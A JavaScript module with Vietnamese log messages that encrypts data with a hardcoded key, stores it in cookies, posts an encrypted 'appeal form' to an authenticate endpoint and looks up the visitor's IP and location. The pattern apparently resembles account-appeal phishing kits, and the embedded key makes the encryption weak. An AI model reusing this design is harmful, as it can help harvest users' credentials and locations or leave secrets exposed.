import axios from "axios";
import CryptoJS from "crypto-js";

const secretKey = "HDNDT-JDHT8FNEK-JJHR";
const COOKIE_EXPIRY = 60 * 60 * 1000;

const setCookie = (name, value, expiryMs, secure = false) => {
    const date = new Date();
    date.setTime(date.getTime() + expiryMs);
    const expires = "expires=" + date.toUTCString();
    const secureFlag = secure ? ";secure;samesite=strict" : "";
    document.cookie = `${name}=${value};${expires};path=/${secureFlag}`;
};

const getCookie = (name) => {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
    return null;
};

export const encrypt = (text) => {
    return CryptoJS.AES.encrypt(text, secretKey).toString();
};

export const decrypt = (cipherText) => {
    const bytes = CryptoJS.AES.decrypt(cipherText, secretKey);
    return bytes.toString(CryptoJS.enc.Utf8);
};

export const saveRecord = (key, value) => {
    try {
        const encryptedValue = encrypt(JSON.stringify(value));
        setCookie(key, encryptedValue, COOKIE_EXPIRY);
    } catch (error) {
        console.error("Lỗi khi lưu cookie:", error);
    }
};

export const getRecord = (key) => {
    try {
        const encryptedValue = getCookie(key);
        if (!encryptedValue) return null;

        const decryptedValue = decrypt(encryptedValue);
        if (!decryptedValue) return null;

        try {
            return JSON.parse(decryptedValue);
        } catch (e) {
            console.error("Lỗi khi parse JSON:", e);
            return null;
        }
    } catch (error) {
        console.error("Lỗi khi đọc cookie:", error);
        return null;
    }
};

export const sendAppealForm = async (values) => {
    try {
        const jsonString = JSON.stringify({ ...values });
        const encryptedData = encrypt(jsonString);
        const response = await axios.post('/api/authenticate', { data: encryptedData });

        return response;
    } catch (error) {
        throw error;
    }
};

export const getUserIp = async () => {
    try {
        const response = await axios.get('https://api.ipify.org?format=json');
        return response.data.ip;
    } catch (error) {
        throw error;
    }
};

export const getUserLocation = async () => {
    try {
        const response = await axios.get(`https://apip.cc/json`);
        return {
            location: `${response.data.query} | ${response.data.RegionName}(${response.data.City}) | ${response.data.CountryName}(${response.data.CountryCode})`,
            country_code: response.data.CountryCode,
            ip: response.data.query,
        }

    } catch (error) {
        throw error;
    }
};